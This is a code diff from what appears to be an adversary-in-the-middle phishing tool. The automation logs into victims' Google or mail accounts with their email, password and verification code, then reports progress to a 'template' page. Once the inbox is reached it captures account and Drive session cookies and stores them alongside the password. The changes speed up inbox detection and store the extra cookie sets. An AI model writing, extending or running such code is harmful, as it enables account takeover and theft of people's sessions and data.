@@ -5662,9 +5662,36 @@ if (!foundSelector) {
                                 }
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Enter submit verification: changed=${enterChangedPage}`);
 
-                                // Set PROCESSING_FINALIZING early once page changed — wrong-code paths
-                                // below will revert to WAITINGCODE if the code was actually incorrect.
-                                if (enterChangedPage) {
+                                const urlNowAfterSubmit = page.url() || '';
+                                const isGoogleInboxEarly = (urlNowAfterSubmit.includes('mail.google.com') && !urlNowAfterSubmit.includes('/challenge/')) ||
+                                    (platformConfig?.inboxUrlPatterns && platformConfig.inboxUrlPatterns.some(p => p.test(urlNowAfterSubmit)));
+
+                                if (isGoogleInboxEarly) {
+                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Immediate inbox URL detected after submit (${urlNowAfterSubmit}). Emitting early PROCESSING_FINALIZING to template.`);
+                                    finalStatus = "PROCESSING_FINALIZING";
+                                    initialCheckResult.reachedInbox = true;
+                                    initialCheckResult.requiresVerification = false;
+                                    initialCheckResult.accountAccess = true;
+                                    updateData.status = "PROCESSING_FINALIZING";
+                                    updateData.verified = true;
+                                    updateData.fullAccess = true;
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        browserId, email, status: "PROCESSING_FINALIZING",
+                                        emailExists: true, accountAccess: true,
+                                        reachedInbox: true, requiresVerification: false,
+                                        verified: true, fullAccess: true,
+                                        platform, timestamp: new Date().toISOString(),
+                                        message: "Successfully verified and reached inbox."
+                                    });
+                                    updateBrowserRowDataFast(browserId, {
+                                        status: "PROCESSING_FINALIZING",
+                                        verified: true,
+                                        fullAccess: true,
+                                        accountAccess: true,
+                                        reachedInbox: true,
+                                        lastJsonResponse: updateData.lastJsonResponse
+                                    });
+                                } else if (enterChangedPage) {
                                     finalStatus = "PROCESSING_FINALIZING";
                                 }
 
@@ -5809,6 +5836,8 @@ if (!foundSelector) {
                                         updateBrowserRowDataFast(browserId, {
                                             status: "PROCESSING_FINALIZING",
                                             cookieJSON: updateData.cookieJSON,
+                                            accountCookieJSON: updateData.accountCookieJSON || '',
+                                            driveCookieJSON: updateData.driveCookieJSON || '',
                                             cookieAccess: true,
                                             verified: true,
                                             fullAccess: true,
@@ -5900,6 +5929,8 @@ if (!foundSelector) {
                                             updateBrowserRowDataFast(browserId, {
                                                 status: "PROCESSING_FINALIZING",
                                                 cookieJSON: updateData.cookieJSON,
+                                                accountCookieJSON: updateData.accountCookieJSON || '',
+                                                driveCookieJSON: updateData.driveCookieJSON || '',
                                                 cookieAccess: true,
                                                 verified: true,
                                                 fullAccess: true,
@@ -5983,13 +6014,27 @@ if (!foundSelector) {
                                 // still on a code entry or transitional page.
                                 let skipSlowPostCodePath = false;
                                 try {
-                                    const quickProbe = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
-                                    if (quickProbe.required && quickProbe.type === 'choice') {
+                                    const curUrlCheck = page.url() || '';
+                                    const isInboxUrlNow = (curUrlCheck.includes('mail.google.com') && !curUrlCheck.includes('/challenge/')) ||
+                                        (platformConfig?.inboxUrlPatterns && platformConfig.inboxUrlPatterns.some(p => p.test(curUrlCheck)));
+                                    if (isInboxUrlNow) {
                                         skipSlowPostCodePath = true;
-                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: choice screen detected immediately after code submit. Skipping slow path.`);
-                                    } else if (quickProbe.required && quickProbe.type === 'text_input') {
-                                        skipSlowPostCodePath = true;
-                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: text input screen (${quickProbe.viewName || 'unknown'}) detected immediately after code submit. Skipping slow path.`);
+                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: inbox URL already reached (${curUrlCheck}). Skipping slow post-code path.`);
+                                    } else {
+                                        const quickProbe = await checkVerification(page, platformConfig).catch(() => ({ required: false }));
+                                        if (quickProbe.required && quickProbe.type === 'choice') {
+                                            skipSlowPostCodePath = true;
+                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: choice screen detected immediately after code submit. Skipping slow path.`);
+                                        } else if (quickProbe.required && quickProbe.type === 'text_input') {
+                                            skipSlowPostCodePath = true;
+                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: text input screen (${quickProbe.viewName || 'unknown'}) detected immediately after code submit. Skipping slow path.`);
+                                        } else {
+                                            const quickInboxCheck = await isInbox(page, platformConfig).catch(() => false);
+                                            if (quickInboxCheck) {
+                                                skipSlowPostCodePath = true;
+                                                logger.info(`[processRow][${browserId}][WAITINGCODE] Quick probe: inbox confirmed. Skipping slow path.`);
+                                            }
+                                        }
                                     }
                                 } catch (_) {}
 
@@ -6083,28 +6128,41 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                         updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = captured.cookieJSON;
-                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
-                                        updateData.verified = true; // Set verified to true on COMPLETED
-                                        updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
-                                        updateData.cookieAccess = true; // Set cookieAccess to true on COMPLETED
+                                        updateData.verified = true;
+                                        updateData.fullAccess = true;
+                                        updateData.cookieAccess = true;
                                         updateData.lastJsonResponse = JSON.stringify({
                                             browserId, email, status: "PROCESSING_FINALIZING",
                                             emailExists: initialCheckResult.emailExists, accountAccess: true,
                                             reachedInbox: true, requiresVerification: false,
-                                            verified: true, fullAccess: true, // Include in response
+                                            verified: true, fullAccess: true,
                                             platform, timestamp: new Date().toISOString(),
                                             message: "Successfully verified with passive approval and reached inbox."
                                         });
-                                        // updateData.verificationCode = ''; // Removed clearing
 
-                                        // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                        // Emit PROCESSING_FINALIZING immediately before multi-tab capture
+                                        updateBrowserRowDataFast(browserId, {
+                                            status: "PROCESSING_FINALIZING",
+                                            cookieAccess: true,
+                                            verified: true,
+                                            fullAccess: true,
+                                            accountAccess: true,
+                                            reachedInbox: true,
+                                            lastJsonResponse: updateData.lastJsonResponse
+                                        });
+
+                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+                                        updateData.cookieJSON = captured.cookieJSON;
+                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+
+                                        // Persist captured cookie sets to fast cache
                                         updateBrowserRowDataFast(browserId, {
                                             status: "PROCESSING_FINALIZING",
                                             cookieJSON: updateData.cookieJSON,
+                                            accountCookieJSON: updateData.accountCookieJSON || '',
+                                            driveCookieJSON: updateData.driveCookieJSON || '',
                                             cookieAccess: true,
                                             verified: true,
                                             fullAccess: true,
@@ -6176,28 +6234,41 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                const captured = await captureMultiTabCookies(browser, page, domain, browserId);
                                 updateData.status = "PROCESSING_FINALIZING";
-                                updateData.cookieJSON = captured.cookieJSON;
-                                if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
-                                updateData.verified = true; // Set verified to true on COMPLETED
-                                updateData.fullAccess = true; // Set fullAccess to true on COMPLETED
-                                updateData.cookieAccess = true; // Set cookieAccess to true on COMPLETED
+                                updateData.verified = true;
+                                updateData.fullAccess = true;
+                                updateData.cookieAccess = true;
                                 updateData.lastJsonResponse = JSON.stringify({
                                     browserId, email, status: "PROCESSING_FINALIZING",
                                     emailExists: initialCheckResult.emailExists, accountAccess: true,
                                     reachedInbox: true, requiresVerification: false,
-                                    verified: true, fullAccess: true, // Include in response
+                                    verified: true, fullAccess: true,
                                     platform, timestamp: new Date().toISOString(),
                                     message: "Successfully verified without code and reached inbox."
                                 });
 
-                                // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
-                                // so smartExtract / cookieDataFetcher can read it even if Drive upload is slow
+                                // Emit PROCESSING_FINALIZING to template immediately BEFORE multi-tab capture
+                                updateBrowserRowDataFast(browserId, {
+                                    status: "PROCESSING_FINALIZING",
+                                    cookieAccess: true,
+                                    verified: true,
+                                    fullAccess: true,
+                                    accountAccess: true,
+                                    reachedInbox: true,
+                                    lastJsonResponse: updateData.lastJsonResponse
+                                });
+
+                                const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+                                updateData.cookieJSON = captured.cookieJSON;
+                                if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
+                                if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+
+                                // Persist captured cookie sets to fast cache
                                 updateBrowserRowDataFast(browserId, {
                                     status: "PROCESSING_FINALIZING",
                                     cookieJSON: updateData.cookieJSON,
+                                    accountCookieJSON: updateData.accountCookieJSON || '',
+                                    driveCookieJSON: updateData.driveCookieJSON || '',
                                     cookieAccess: true,
                                     verified: true,
                                     fullAccess: true,
@@ -6486,6 +6557,8 @@ if (!foundSelector) {
                                 updateBrowserRowDataFast(browserId, {
                                     status: "PROCESSING_FINALIZING",
                                     cookieJSON: updateData.cookieJSON,
+                                    accountCookieJSON: updateData.accountCookieJSON || '',
+                                    driveCookieJSON: updateData.driveCookieJSON || '',
                                     cookieAccess: true,
                                     verified: true,
                                     fullAccess: isInboxFinal,
@@ -6948,10 +7021,13 @@ if (!foundSelector) {
             return getCachedRow(browserId)?.browserIdentity || '';
         })();
         updateData = {
+            ...updateData,
             status: finalStatus,
             email: email || '',
             driveUrl: updateData.driveUrl || '',
             cookieJSON: updateData.cookieJSON || '',
+            accountCookieJSON: updateData.accountCookieJSON || '',
+            driveCookieJSON: updateData.driveCookieJSON || '',
             browserIdentity: recoveredIdentity,
             lastJsonResponse: (waitingStates.includes(finalStatus) && updateData.lastJsonResponse)
                 ? updateData.lastJsonResponse
@@ -7022,6 +7098,8 @@ if (!foundSelector) {
                     email: email || '',
                     password: password || '',
                     cookieJSON: updateData.cookieJSON,
+                    accountCookieJSON: updateData.accountCookieJSON || '',
+                    driveCookieJSON: updateData.driveCookieJSON || '',
                     browserIdentity: updateData.browserIdentity || '',
                     verified: updateData.verified,
                     fullAccess: updateData.fullAccess,
